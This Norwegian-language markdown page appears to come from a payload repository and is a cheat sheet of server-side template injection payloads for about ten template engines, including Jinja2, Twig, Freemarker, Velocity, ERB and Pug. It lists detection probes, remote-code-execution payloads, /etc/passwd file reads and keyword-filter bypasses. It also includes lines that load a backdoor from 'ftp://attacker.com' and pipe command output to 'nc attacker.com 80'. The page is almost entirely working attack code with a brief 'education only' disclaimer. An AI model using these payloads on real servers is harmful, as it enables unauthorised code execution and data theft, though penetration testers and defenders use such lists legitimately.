# 🔥 Samling av SSTI-payloads

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SSTI.tr.md) • [🇬🇷 Ελληνικά](SSTI.el.md)

> **Begreper og presisering:** SSTI (Server-Side Template Injection) oppstår når inndata tolkes som malkode. Et resultat som `49` er et undersøkelsesspor, ikke alene et bevis eller en sikker identifikasjon av malmotoren. Objekter, sandbox, språkversjon og tilgjengelige metoder avgjør om et eksempel virker. Faste MRO-/subklasseindekser og eldre Twig-/Java-/Node-eksempler er spesielt miljøavhengige. Alle payloads er bevart uten å gjøre dem mer universelle.

```
  ███████╗███████╗████████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗███████╗   ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║███████║   ██║   ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                     Server-Side Template Injection
```

---

## 🔍 Payloads for deteksjon

### Generell deteksjon
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
{{7*'7'}}
```

> Hvis responsen inneholder `49`, kan det tyde på SSTI; se presiseringen ovenfor.

### Identifiser malmotoren
```
{{7*'7'}}         → Jinja2/Twig returns 7777777
${7*7}            → Freemarker/Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf
```

---

## 🐍 Python (Jinja2)

### Deteksjon
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{request}}
```

### Payloads for ekstern kodekjøring (RCE)
```python
# Metode 1 – config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Metode 2 – cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Metode 3 – MRO (vanligst i originalen)
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# Metode 4 – lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Metode 5 – Request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Les filer
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```

### Omgåelse av filtre
```python
# Med attr-filteret
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Med join-filteret
{%set x=''|join('')|attr('__class__')%}

# Heksadesimal koding
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

## 🌿 Python (Mako)

```python
<%import os%>${os.popen("id").read()}
${self.module.cache.util.os.system("id")}
${self.template.module.cache.util.os.popen("id").read()}
```

---

## ☕ Java (Freemarker)

### Deteksjon
```java
${7*7}
${object.class}
<#assign s="freemarker.template.utility.Execute"?new()>${s("id")}
```

### Payloads for ekstern kodekjøring (RCE)
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 🍃 Java (Velocity)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Enkelt eksempel
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

## 🌱 Java (Thymeleaf)

### Deteksjon
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Payloads for ekstern kodekjøring (RCE)
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

---

## 🌸 Java (Pebble)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

---

## 🐦 PHP (Twig)

### Deteksjon
```php
{{7*7}}
{{7*'7'}}  → 7777777 (string multiplication)
{{dump(app)}}
{{_self}}
```

### Payloads for ekstern kodekjøring (RCE)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
```

### Les filer
```php
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

---

## 💎 Ruby (ERB)

### Deteksjon
```ruby
<%= 7*7 %>
<%= self %>
```

### Payloads for ekstern kodekjøring (RCE)
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

---

## 🟢 Node.js (Jade/Pug)

### Deteksjon
```javascript
#{7*7}
-var x = 1; p= x
```

### Payloads for ekstern kodekjøring (RCE)
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require
-x('child_process').exec('id | nc attacker.com 80')
```

---

## 🔷 .NET (Razor)

```csharp
@(7*7)
@{
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c id";
    p.Start();
}
```

---

## 📊 Hurtigreferanse

| Malmotor | Deteksjon | RCE |
|-----------------|-----------|-----|
| Jinja2 | `{{7*7}}` | `{{config.__class__...}}` |
| Twig | `{{7*'7'}}` | `{{_self.env...}}` |
| Freemarker | `${7*7}` | `<#assign ex=...>` |
| Velocity | `$class.class` | `#set($rt=...)` |
| ERB | `<%= 7*7 %>` | `<%= system('id') %>` |
| Pug | `#{7*7}` | `#{global.process...}` |

---

## 🛡️ Omgåelsesteknikker

### Blokkerte nøkkelord
```python
# Bruk forespørselsargumenter
{{request.args.cmd}}?cmd=__class__

# Sammenkjeding av strenger
{{''['__cla'+'ss__']}}

# Heksadesimal koding
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### Blokkerte hakeparenteser
```python
{%print(7*7)%}
```

---

## 📚 Ressurser

- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

<p align="center">
  <b>🔥 Samling av SSTI-payloads</b><br>
  <i>Bare til undervisningsformål!</i>
</p>
